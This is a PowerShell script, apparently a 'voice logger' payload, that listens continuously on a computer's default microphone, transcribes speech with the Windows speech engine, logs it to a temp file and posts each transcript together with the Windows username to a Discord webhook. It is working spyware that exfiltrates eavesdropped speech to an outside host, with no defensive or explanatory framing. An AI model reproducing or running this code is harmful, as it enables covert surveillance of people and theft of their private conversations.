function DC-Upload {

	[CmdletBinding()]
	param (
		[parameter(Position=0,Mandatory=$False)]
		[string]$text 
	)

	# $dc = 'https://discord.com/api/webhooks/1203399887870369804/3YDivde8ejGp57vJoYBzJK0RvBNWjQGJsrLONKtJU7-dygS1afW2WFbd34MJi63zOru3'

	$Body = @{
	  'username' = $env:username
	  'content' = $text
	}

	if (-not ([string]::IsNullOrEmpty($text))){Invoke-RestMethod -ContentType 'Application/Json' -Uri $dc  -Method Post -Body ($Body | ConvertTo-Json)};
}



function voiceLogger {

    Add-Type -AssemblyName System.Speech
    $recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine
    $grammar = New-Object System.Speech.Recognition.DictationGrammar
    $recognizer.LoadGrammar($grammar)
    $recognizer.SetInputToDefaultAudioDevice()

    while ($true) {
        $result = $recognizer.Recognize()
        if ($result) {
            $results = $result.Text
            Write-Output $results
            $log = "$env:tmp/VoiceLog.txt"
            echo $results > $log
            $text = get-content $log -raw
            DC-Upload $text

            # Use a switch statement with the $results variable
            switch -regex ($results) {
                '\bnote\b' {saps notepad}
                '\bexit\b' {break}
            }
        }
    }
    Clear-Content -Path $log
}

voiceLogger
